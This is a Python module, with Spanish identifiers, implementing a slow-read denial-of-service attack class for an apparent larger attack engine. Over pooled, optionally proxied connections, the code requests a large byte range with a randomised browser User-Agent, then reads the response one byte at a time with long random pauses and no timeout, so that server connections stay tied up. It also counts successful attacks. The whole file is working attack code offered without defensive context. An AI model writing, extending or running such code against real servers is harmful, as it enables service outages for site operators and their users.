import asyncio
import random
import aiohttp
from aiohttp import ClientSession, ClientTimeout, ClientError

class SlowRead:
    def __init__(self, motor):
        self.motor = motor
        
    async def ejecutar(self, proxy=None):
        sesion = None
        try:
            sesion = await self.motor.pool.obtener_conexion(
                self.motor.host,
                self.motor.puerto,
                self.motor.ssl,
                proxy
            )
            
            if not sesion:
                return
                
            cabeceras = {
                "User-Agent": random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
                ]),
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Range": f"bytes=0-{random.randint(1000000, 9999999)}"
            }
            
            url = f"{'https' if self.motor.ssl else 'http'}://{self.motor.host}:{self.motor.puerto}/"
            
            async with sesion.get(
                url,
                headers=cabeceras,
                timeout=ClientTimeout(total=None)
            ) as respuesta:
                bytes_leidos = 0
                while bytes_leidos < 100:
                    chunk = await respuesta.content.read(1)
                    if not chunk:
                        break
                    bytes_leidos += 1
                    await asyncio.sleep(random.uniform(10, 30))
                    
                self.motor.estadisticas.agregar_exito(len(cabeceras))
                
        except (asyncio.CancelledError, ClientError, Exception):
            self.motor.estadisticas.agregar_error()
        finally:
            if sesion:
                await self.motor.pool.liberar_conexion(sesion)